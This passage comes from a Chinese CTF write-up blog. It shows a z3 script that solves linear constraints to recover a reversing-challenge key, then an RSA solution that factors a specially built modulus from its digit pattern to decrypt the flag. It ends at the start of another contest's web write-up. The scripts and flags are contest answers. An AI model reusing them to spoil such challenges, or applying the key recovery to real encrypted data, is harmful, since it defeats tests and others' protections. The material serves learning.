<span class="number">49705</span> * a27 + <span class="number">5149</span> * a26 + <span class="number">16127</span> * a25 + <span class="number">29867</span> * a22 + <span class="number">50998</span> * a21 + <span class="number">13714</span> * a19 + <span class="number">18867</span> * a14 + <span class="number">19385</span> * a13 + <span class="number">38458</span> * a11 + <span class="number">12962</span> * a10 + <span class="number">24700</span> * a9 + <span class="number">50206</span> * a5 + <span class="number">56918</span> * a3 + <span class="number">20452</span> * a0 + <span class="number">18062</span> * a1 - <span class="number">56424</span> * a2 - <span class="number">10457</span> * a4 - <span class="number">12288</span> * a6 - <span class="number">54591</span> * a7 - <span class="number">44777</span> * a8 - <span class="number">52078</span> * a12 - <span class="number">9805</span> * a15 - <span class="number">48011</span> * a16 - <span class="number">27363</span> * a17 - <span class="number">20890</span> * a18 - <span class="number">788</span> * a20 - <span class="number">7954</span> * a23 - <span class="number">34056</span> * a24 - <span class="number">34732</span> * a28 - <span class="number">54092</span> * a29 + <span class="number">35416</span> * a31 == <span class="number">7501764</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">44968</span> * a30 + <span class="number">41644</span> * a26 + <span class="number">24333</span> * a25 + <span class="number">40656</span> * a23 + <span class="number">37330</span> * a22 + <span class="number">52431</span> * a20 + <span class="number">18903</span> * a19 + <span class="number">42329</span> * a16 + <span class="number">40645</span> * a13 + <span class="number">0x1FFF</span> * a8 + <span class="number">21330</span> * a5 + <span class="number">1951</span> * a2 + -<span class="number">39611</span> * a0 + <span class="number">25246</span> * a1 - <span class="number">37145</span> * a3 - <span class="number">3824</span> * a4 - <span class="number">49145</span> * a6 - <span class="number">43603</span> * a7 - <span class="number">60671</span> * a9 - <span class="number">53032</span> * a10 - <span class="number">48392</span> * a11 - <span class="number">15417</span> * a12 - <span class="number">13059</span> * a14 - <span class="number">58653</span> * a15 - <span class="number">51631</span> * a17 - <span class="number">50173</span> * a18 - <span class="number">44904</span> * a21 - <span class="number">34380</span> * a24 - <span class="number">18100</span> * a27 - <span class="number">57765</span> * a28 - <span class="number">64534</span> * a29 - <span class="number">26760</span> * a31 == -<span class="number">35816639</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">28579</span> * a30 + <span class="number">34688</span> * a29 + <span class="number">29438</span> * a27 + <span class="number">44211</span> * a24 + <span class="number">57593</span> * a21 + <span class="number">7046</span> * a19 + <span class="number">39526</span> * a18 + <span class="number">17545</span> * a17 + <span class="number">61374</span> * a16 + <span class="number">15405</span> * a15 + <span class="number">30392</span> * a14 + <span class="number">19579</span> * a12 + <span class="number">47959</span> * a11 + <span class="number">23926</span> * a9 + <span class="number">43929</span> * a5 + <span class="number">53538</span> * a3 + <span class="number">45166</span> * a2 + -<span class="number">39824</span> * a0 + <span class="number">44401</span> * a1 - <span class="number">2540</span> * a4 - <span class="number">54452</span> * a6 - <span class="number">11199</span> * a7 - <span class="number">19801</span> * a8 - <span class="number">13592</span> * a10 - <span class="number">29922</span> * a13 - <span class="number">34144</span> * a20 - <span class="number">5305</span> * a22 - <span class="number">46917</span> * a23 - <span class="number">4511</span> * a25 - <span class="number">23881</span> * a26 - <span class="number">39081</span> * a28 + <span class="number">3296</span> * a31 == <span class="number">30983928</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">40454</span> * a30 + <span class="number">64380</span> * a29 + <span class="number">41415</span> * a27 + <span class="number">8487</span> * a22 + <span class="number">49381</span> * a19 + <span class="number">7959</span> * a18 + <span class="number">36587</span> * a16 + <span class="number">24510</span> * a15 + <span class="number">6928</span> * a14 + <span class="number">60087</span> * a7 + <span class="number">59815</span> * a5 + <span class="number">15203</span> * a2 + <span class="number">62215</span> * a0 + <span class="number">19566</span> * a1 - <span class="number">30340</span> * a3 - <span class="number">15964</span> * a4 - <span class="number">13939</span> * a6 - <span class="number">43008</span> * a8 - <span class="number">44925</span> * a9 - <span class="number">49239</span> * a10 - <span class="number">40498</span> * a11 - <span class="number">54453</span> * a12 - <span class="number">33557</span> * a13 - <span class="number">24721</span> * a17 - <span class="number">21456</span> * a20 - <span class="number">40311</span> * a21 - <span class="number">61111</span> * a23 - <span class="number">18918</span> * a24 - <span class="number">33393</span> * a25 - <span class="number">9301</span> * a26 - <span class="number">61619</span> * a28 + <span class="number">58498</span> * a31 == -<span class="number">4472687</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">2766</span> * a29 + <span class="number">14305</span> * a28 + <span class="number">10809</span> * a26 + <span class="number">6578</span> * a24 + <span class="number">53612</span> * a23 + <span class="number">36333</span> * a21 + <span class="number">30380</span> * a20 + <span class="number">3633</span> * a19 + <span class="number">35027</span> * a18 + <span class="number">62097</span> * a15 + <span class="number">39085</span> * a14 + <span class="number">21483</span> * a13 + <span class="number">43131</span> * a11 + <span class="number">5725</span> * a9 + <span class="number">40291</span> * a8 + <span class="number">63291</span> * a5 + <span class="number">57560</span> * a4 + <span class="number">40977</span> * a3 + <span class="number">33894</span> * a2 + <span class="number">35423</span> * a0 - <span class="number">12994</span> * a1 - <span class="number">32256</span> * a6 - <span class="number">23534</span> * a7 - <span class="number">40660</span> * a10 - <span class="number">19119</span> * a12 - <span class="number">33732</span> * a16 - <span class="number">63756</span> * a17 - <span class="number">13528</span> * a22 - <span class="number">47605</span> * a25 - <span class="number">43202</span> * a27 - <span class="number">42819</span> * a30 - <span class="number">34232</span> * a31 == <span class="number">18523534</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">48054</span> * a29 + <span class="number">27903</span> * a28 + <span class="number">44427</span> * a27 + <span class="number">26215</span> * a26 + <span class="number">10136</span> * a25 + <span class="number">62674</span> * a20 + <span class="number">31419</span> * a19 + <span class="number">13647</span> * a18 + <span class="number">19761</span> * a15 + <span class="number">34155</span> * a11 + <span class="number">26302</span> * a7 + <span class="number">27559</span> * a6 + <span class="number">53130</span> * a5 + <span class="number">27162</span> * a4 + <span class="number">55103</span> * a3 + <span class="number">58838</span> * a2 + <span class="number">44942</span> * a0 + <span class="number">63420</span> * a1 - <span class="number">24313</span> * a8 - <span class="number">42499</span> * a9 - <span class="number">21629</span> * a10 - <span class="number">2633</span> * a12 - <span class="number">55014</span> * a13 - <span class="number">22926</span> * a14 - <span class="number">305</span> * a16 - <span class="number">63708</span> * a17 - <span class="number">32334</span> * a21 - <span class="number">47684</span> * a22 - <span class="number">54226</span> * a23 - <span class="number">50848</span> * a24 - <span class="number">15102</span> * a30 - <span class="number">22362</span> * a31 == <span class="number">20982750</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">59525</span> * a30 + <span class="number">23936</span> * a28 + <span class="number">61587</span> * a27 + <span class="number">4221</span> * a26 + <span class="number">55552</span> * a25 + <span class="number">13058</span> * a24 + <span class="number">45781</span> * a15 + <span class="number">65438</span> * a14 + <span class="number">51231</span> * a13 + <span class="number">33875</span> * a11 + <span class="number">6137</span> * a8 + <span class="number">62261</span> * a6 + <span class="number">46559</span> * a4 + <span class="number">26426</span> * a3 + <span class="number">9153</span> * a2 + <span class="number">6300</span> * a0 - <span class="number">30549</span> * a1 - <span class="number">55683</span> * a5 - <span class="number">44433</span> * a7 - <span class="number">46194</span> * a9 - <span class="number">57198</span> * a10 - <span class="number">45266</span> * a12 - <span class="number">6605</span> * a16 - <span class="number">43397</span> * a17 - <span class="number">7672</span> * a18 - <span class="number">48485</span> * a19 - <span class="number">54035</span> * a20 - <span class="number">12567</span> * a21 - <span class="number">47051</span> * a22 - <span class="number">62256</span> * a23 - <span class="number">9828</span> * a29 + <span class="number">50225</span> * a31 == <span class="number">5070455</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">39286</span> * a30 + <span class="number">13236</span> * a29 + <span class="number">42884</span> * a24 + <span class="number">12704</span> * a23 + <span class="number">53136</span> * a22 + <span class="number">47722</span> * a19 + <span class="number">30422</span> * a18 + <span class="number">10481</span> * a17 + <span class="number">55058</span> * a16 + <span class="number">63967</span> * a15 + <span class="number">8353</span> * a11 + <span class="number">62270</span> * a10 + <span class="number">12090</span> * a9 + <span class="number">14796</span> * a4 + <span class="number">59059</span> * a3 + <span class="number">5686</span> * a2 + -<span class="number">28415</span> * a0 + <span class="number">36297</span> * a1 - <span class="number">11307</span> * a5 - <span class="number">57251</span> * a6 - <span class="number">29507</span> * a7 - <span class="number">41415</span> * a8 - <span class="number">24476</span> * a12 - <span class="number">41751</span> * a13 - <span class="number">46589</span> * a14 - <span class="number">55870</span> * a20 - <span class="number">6321</span> * a21 - <span class="number">34350</span> * a25 - <span class="number">32922</span> * a26 - <span class="number">64909</span> * a27 - <span class="number">50870</span> * a28 + <span class="number">49349</span> * a31 == <span class="number">3066924</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">18612</span> * a27 + <span class="number">54808</span> * a25 + <span class="number">42491</span> * a23 + <span class="number">16634</span> * a22 + <span class="number">52361</span> * a21 + <span class="number">6252</span> * a20 + <span class="number">63445</span> * a18 + <span class="number">57764</span> * a16 + <span class="number">3991</span> * a15 + <span class="number">61646</span> * a14 + <span class="number">23244</span> * a10 + <span class="number">29174</span> * a9 + <span class="number">5707</span> * a6 + <span class="number">63976</span> * a4 + <span class="number">58731</span> * a2 + <span class="number">15479</span> * a0 + <span class="number">10453</span> * a1 - <span class="number">9782</span> * a3 - <span class="number">9166</span> * a5 - <span class="number">21516</span> * a7 - <span class="number">2689</span> * a8 - <span class="number">47968</span> * a11 - <span class="number">38843</span> * a12 - <span class="number">13488</span> * a13 - <span class="number">57649</span> * a17 - <span class="number">487</span> * a19 - <span class="number">30704</span> * a24 - <span class="number">61218</span> * a26 - <span class="number">32873</span> * a28 - <span class="number">58677</span> * a29 - <span class="number">2280</span> * a30 + <span class="number">35233</span> * a31 == <span class="number">26232118</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">38132</span> * a30 + <span class="number">58430</span> * a28 + <span class="number">38392</span> * a27 + <span class="number">29396</span> * a25 + <span class="number">15688</span> * a24 + <span class="number">28509</span> * a21 + <span class="number">23301</span> * a17 + <span class="number">56629</span> * a16 + <span class="number">11252</span> * a14 + <span class="number">28641</span> * a13 + <span class="number">35504</span> * a12 + <span class="number">41197</span> * a11 + <span class="number">9520</span> * a4 + <span class="number">50614</span> * a2 + <span class="number">36368</span> * a0 - <span class="number">30534</span> * a1 - <span class="number">7805</span> * a3 - <span class="number">60795</span> * a5 - <span class="number">17511</span> * a6 - <span class="number">34692</span> * a7 - <span class="number">22139</span> * a8 - <span class="number">49013</span> * a9 - <span class="number">24672</span> * a10 - <span class="number">22264</span> * a15 - <span class="number">55578</span> * a18 - <span class="number">61882</span> * a19 - <span class="number">48469</span> * a20 - <span class="number">8197</span> * a22 - <span class="number">43020</span> * a23 - <span class="number">36911</span> * a26 - <span class="number">6762</span> * a29 + <span class="number">56670</span> * a31 == -<span class="number">860377</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">19958</span> * a29 + <span class="number">35318</span> * a27 + <span class="number">58305</span> * a24 + <span class="number">55072</span> * a20 + <span class="number">58300</span> * a16 + <span class="number">16494</span> * a13 + <span class="number">61205</span> * a9 + <span class="number">8511</span> * a8 + <span class="number">21876</span> * a6 + <span class="number">1791</span> * a3 + <span class="number">28247</span> * a2 + <span class="number">3542</span> * a0 - <span class="number">17533</span> * a1 - <span class="number">44455</span> * a4 - <span class="number">2748</span> * a5 - <span class="number">38052</span> * a7 - <span class="number">16528</span> * a10 - <span class="number">4664</span> * a11 - <span class="number">13326</span> * a12 - <span class="number">52661</span> * a14 - <span class="number">38860</span> * a15 - <span class="number">60164</span> * a17 - <span class="number">39975</span> * a18 - <span class="number">19566</span> * a19 - <span class="number">55251</span> * a21 - <span class="number">8160</span> * a22 - <span class="number">54674</span> * a23 - <span class="number">29010</span> * a25 - <span class="number">6627</span> * a26 - <span class="number">15962</span> * a28 - <span class="number">10549</span> * a30 - <span class="number">8177</span> * a31 == -<span class="number">14482154</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">15394</span> * a29 + <span class="number">13827</span> * a28 + <span class="number">47703</span> * a27 + <span class="number">37204</span> * a26 + <span class="number">8621</span> * a23 + <span class="number">26034</span> * a20 + <span class="number">38644</span> * a19 + <span class="number">26883</span> * a18 + <span class="number">31346</span> * a17 + <span class="number">29853</span> * a15 + <span class="number">2052</span> * a13 + <span class="number">37617</span> * a8 + <span class="number">35004</span> * a3 + <span class="number">25124</span> * a2 + -<span class="number">7510</span> * a0 - <span class="number">61303</span> * a1 - <span class="number">34033</span> * a4 - <span class="number">49161</span> * a5 - <span class="number">6021</span> * a6 - <span class="number">36125</span> * a7 - <span class="number">10528</span> * a9 - <span class="number">47741</span> * a10 - <span class="number">45531</span> * a11 - <span class="number">1546</span> * a12 - <span class="number">59464</span> * a14 - <span class="number">22656</span> * a16 - <span class="number">24655</span> * a21 - <span class="number">9816</span> * a22 - <span class="number">22299</span> * a24 - <span class="number">23745</span> * a25 - <span class="number">23945</span> * a30 + <span class="number">48741</span> * a31 == -<span class="number">17062269</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">27496</span> * a29 + <span class="number">8511</span> * a27 + <span class="number">61644</span> * a26 + <span class="number">35917</span> * a24 + <span class="number">16432</span> * a21 + <span class="number">53570</span> * a19 + <span class="number">30949</span> * a18 + <span class="number">56668</span> * a16 + <span class="number">5395</span> * a15 + <span class="number">47866</span> * a14 + <span class="number">33349</span> * a12 + <span class="number">41169</span> * a9 + <span class="number">34746</span> * a6 + <span class="number">39102</span> * a5 + <span class="number">19310</span> * a0 + <span class="number">1288</span> * a1 - <span class="number">38840</span> * a2 - <span class="number">49229</span> * a3 - <span class="number">40618</span> * a4 - <span class="number">41363</span> * a7 - <span class="number">45367</span> * a8 - <span class="number">21440</span> * a10 - <span class="number">36535</span> * a11 - <span class="number">43289</span> * a13 - <span class="number">41392</span> * a17 - <span class="number">40337</span> * a20 - <span class="number">1430</span> * a22 - <span class="number">28334</span> * a23 - <span class="number">46487</span> * a25 - <span class="number">42458</span> * a28 - <span class="number">59664</span> * a30 + <span class="number">64335</span> * a31 == <span class="number">6695285</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">41403</span> * a29 + <span class="number">13806</span> * a27 + <span class="number">26203</span> * a26 + <span class="number">59304</span> * a24 + <span class="number">56824</span> * a22 + <span class="number">3954</span> * a21 + <span class="number">33269</span> * a20 + <span class="number">12986</span> * a16 + <span class="number">60427</span> * a15 + <span class="number">42087</span> * a14 + <span class="number">30996</span> * a13 + <span class="number">51835</span> * a11 + <span class="number">53494</span> * a9 + <span class="number">33384</span> * a8 + <span class="number">41797</span> * a4 + <span class="number">17974</span> * a3 + -<span class="number">18187</span> * a0 + <span class="number">28981</span> * a1 - <span class="number">53485</span> * a2 - <span class="number">20458</span> * a5 - <span class="number">8491</span> * a6 - <span class="number">16831</span> * a7 - <span class="number">31995</span> * a10 - <span class="number">12109</span> * a12 - <span class="number">51691</span> * a17 - <span class="number">58925</span> * a18 - <span class="number">40872</span> * a19 - <span class="number">30202</span> * a23 - <span class="number">30793</span> * a25 - <span class="number">42110</span> * a28 - <span class="number">1100</span> * a30 - <span class="number">26194</span> * a31 == <span class="number">16909859</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">53536</span> * a29 + <span class="number">47559</span> * a28 + <span class="number">42732</span> * a24 + <span class="number">34737</span> * a23 + <span class="number">48156</span> * a22 + <span class="number">15071</span> * a21 + <span class="number">38175</span> * a18 + <span class="number">12186</span> * a17 + <span class="number">28859</span> * a16 + <span class="number">19225</span> * a13 + <span class="number">28950</span> * a11 + <span class="number">19883</span> * a9 + <span class="number">40590</span> * a7 + <span class="number">44081</span> * a5 + <span class="number">20386</span> * a4 + -<span class="number">40011</span> * a0 - <span class="number">26232</span> * a1 - <span class="number">4849</span> * a2 - <span class="number">60564</span> * a3 - <span class="number">50739</span> * a6 - <span class="number">17237</span> * a8 - <span class="number">35381</span> * a10 - <span class="number">4203</span> * a12 - <span class="number">50964</span> * a14 - <span class="number">39946</span> * a15 - <span class="number">22511</span> * a19 - <span class="number">20539</span> * a20 - <span class="number">60250</span> * a25 - <span class="number">61430</span> * a26 - <span class="number">11009</span> * a27 - <span class="number">8879</span> * a30 + <span class="number">46741</span> * a31 == -<span class="number">1622782</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">5442</span> * a29 + <span class="number">45907</span> * a28 + <span class="number">7689</span> * a27 + <span class="number">56136</span> * a25 + <span class="number">20039</span> * a24 + <span class="number">18672</span> * a23 + <span class="number">41239</span> * a22 + <span class="number">9871</span> * a20 + <span class="number">34328</span> * a18 + <span class="number">27387</span> * a17 + <span class="number">41615</span> * a16 + <span class="number">41961</span> * a13 + <span class="number">50367</span> * a12 + <span class="number">59350</span> * a8 + <span class="number">29632</span> * a7 + <span class="number">22126</span> * a6 + <span class="number">61953</span> * a5 + <span class="number">34932</span> * a4 + <span class="number">3756</span> * a3 + -<span class="number">42653</span> * a0 + <span class="number">43668</span> * a1 - <span class="number">10988</span> * a2 - <span class="number">48711</span> * a9 - <span class="number">23958</span> * a10 - <span class="number">33557</span> * a11 - <span class="number">17831</span> * a14 - <span class="number">4583</span> * a15 - <span class="number">29750</span> * a19 - <span class="number">49888</span> * a21 - <span class="number">30956</span> * a26 - <span class="number">41068</span> * a30 + <span class="number">23514</span> * a31 == <span class="number">33025495</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">41909</span> * a26 + <span class="number">24036</span> * a24 + <span class="number">21760</span> * a22 + <span class="number">50228</span> * a21 + <span class="number">63177</span> * a19 + <span class="number">6738</span> * a18 + <span class="number">869</span> * a17 + <span class="number">19553</span> * a15 + <span class="number">53583</span> * a14 + <span class="number">59508</span> * a13 + <span class="number">15986</span> * a11 + <span class="number">3678</span> * a5 + <span class="number">10458</span> * a4 + <span class="number">5179</span> * a3 + <span class="number">38342</span> * a2 + -<span class="number">26968</span> * a0 - <span class="number">23313</span> * a1 - <span class="number">32333</span> * a6 - <span class="number">43275</span> * a7 - <span class="number">2423</span> * a8 - <span class="number">60827</span> * a9 - <span class="number">42621</span> * a10 - <span class="number">27590</span> * a12 - <span class="number">56307</span> * a16 - <span class="number">30359</span> * a20 - <span class="number">19919</span> * a23 - <span class="number">18153</span> * a25 - <span class="number">6931</span> * a27 - <span class="number">5822</span> * a28 - <span class="number">30949</span> * a29 - <span class="number">16572</span> * a30 + <span class="number">11920</span> * a31 == -<span class="number">10454601</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">43819</span> * a29 + <span class="number">54696</span> * a27 + <span class="number">55323</span> * a24 + <span class="number">63177</span> * a23 + <span class="number">6747</span> * a22 + <span class="number">31098</span> * a21 + <span class="number">37870</span> * a18 + <span class="number">55168</span> * a16 + <span class="number">1703</span> * a15 + <span class="number">64744</span> * a14 + <span class="number">57567</span> * a12 + <span class="number">35013</span> * a11 + <span class="number">52295</span> * a10 + <span class="number">46356</span> * a9 + <span class="number">29760</span> * a7 + <span class="number">4313</span> * a6 + <span class="number">18877</span> * a5 + <span class="number">8314</span> * a4 + <span class="number">35980</span> * a2 + <span class="number">8386</span> * a0 + <span class="number">57646</span> * a1 - <span class="number">4029</span> * a3 - <span class="number">47059</span> * a8 - <span class="number">25490</span> * a13 - <span class="number">62526</span> * a17 - <span class="number">63227</span> * a19 - <span class="number">27315</span> * a20 - <span class="number">23370</span> * a25 - <span class="number">37329</span> * a26 - <span class="number">6309</span> * a28 - <span class="number">12433</span> * a30 + <span class="number">8882</span> * a31 == <span class="number">51177223</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">17153</span> * a27 + <span class="number">41549</span> * a26 + <span class="number">28202</span> * a24 + <span class="number">36806</span> * a23 + <span class="number">12690</span> * a22 + <span class="number">42821</span> * a20 + <span class="number">39834</span> * a19 + <span class="number">17994</span> * a17 + <span class="number">32765</span> * a14 + <span class="number">25687</span> * a10 + <span class="number">33388</span> * a9 + <span class="number">143</span> * a4 + <span class="number">63776</span> * a0 + <span class="number">8682</span> * a1 - <span class="number">16324</span> * a2 - <span class="number">20022</span> * a3 - <span class="number">48973</span> * a5 - <span class="number">57775</span> * a6 - <span class="number">43820</span> * a7 - <span class="number">41070</span> * a8 - <span class="number">15669</span> * a11 - <span class="number">6946</span> * a12 - <span class="number">23187</span> * a13 - <span class="number">46495</span> * a15 - <span class="number">8395</span> * a16 - <span class="number">27782</span> * a18 - <span class="number">46043</span> * a21 - <span class="number">15428</span> * a25 - <span class="number">59010</span> * a28 - <span class="number">49235</span> * a29 - <span class="number">53666</span> * a30 + <span class="number">28539</span> * a31 == -<span class="number">15479857</span>)</span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">s = []</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a0].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a1].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a2].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a3].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a4].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a5].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a6].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a7].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a8].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a9].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a10].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a11].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a12].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a13].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a14].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a15].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a16].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a17].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a18].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a19].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a20].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a21].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a22].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a23].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a24].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a25].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a26].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a27].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a28].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a29].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a30].as_long()))</span><br><span class="line">s.append(<span class="built_in">chr</span>(m[a31].as_long()))</span><br><span class="line"><span class="comment"># print bytes(s).decode()</span></span><br><span class="line">a = [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\b&quot;</span> + i,</span><br><span class="line"></span><br><span class="line"><span class="comment"># cs28RtthHqsbufojsLz7yg2DYqWQEEcY</span></span><br></pre></td></tr></table></figure>
<h3 id="crypto">Crypto</h3>
<h4 id="rsa1">rsa1</h4>
<p>说来也巧，上两周的<a
href="https://southsea.st/2019/11/10/2019-BYB-Preliminary/#math">福建省赛</a>刚解过一次同类型的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">n = <span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line"></span><br><span class="line">a_front = <span class="built_in">str</span>(n)[:<span class="number">200</span>]</span><br><span class="line">a_after = <span class="built_in">str</span>(n)[-<span class="number">200</span>:]</span><br><span class="line">a_center = <span class="built_in">str</span>(n)[<span class="number">200</span>:-<span class="number">200</span>]</span><br><span class="line"></span><br><span class="line">a2_b2 = <span class="built_in">int</span>(<span class="string">&quot;1&quot;</span> + a_center) - <span class="built_in">int</span>(a_after + a_front) + <span class="number">1</span></span><br><span class="line">ab = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">int</span>(a_front) - <span class="number">1</span>) + a_after)</span><br><span class="line"></span><br><span class="line">a_plus_b = gmpy2.iroot(a2_b2 + <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line">a_reduce_b = gmpy2.iroot(a2_b2 - <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print a_plus_b, a_reduce_b</span></span><br><span class="line"></span><br><span class="line">a_plus_b = <span class="number">106838564591144305676926782070047912332321708552599459433421988005590173618301409441680963131339125642947008343458604585435014375496821988389947672305582602421970993398746844212869008998505794666381010</span></span><br><span class="line">a_reduce_b = <span class="number">54270186678010731553949991319969930487691255406327041359307445729571793416734930873100299986170777117022211293344445720881101722862892913267074929159777144041266065578072445135827424558087738564056836</span></span><br><span class="line"></span><br><span class="line">a = (a_plus_b + a_reduce_b) // <span class="number">2</span></span><br><span class="line">b = a_plus_b - a</span><br><span class="line"><span class="comment"># print a</span></span><br><span class="line"><span class="comment"># print b</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">str</span>(a) + <span class="built_in">str</span>(b))</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">str</span>(b) + <span class="built_in">str</span>(a))</span><br><span class="line">f = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, f)</span><br><span class="line">flag = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;637c3dda0a943c9e837ede64cba71cbcf8e0be7bb1ca9ea1de8b9aa589ce703f&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 黑盾杯 部分题解</title>
    <url>/2019-HDB/</url>
    <content><![CDATA[<p>我太南了。</p>
<span id="more"></span>
<h3 id="web">WEB</h3>
<h4 id="i-have-the_flag">i have the_flag</h4>
<p>主要函数。</p>
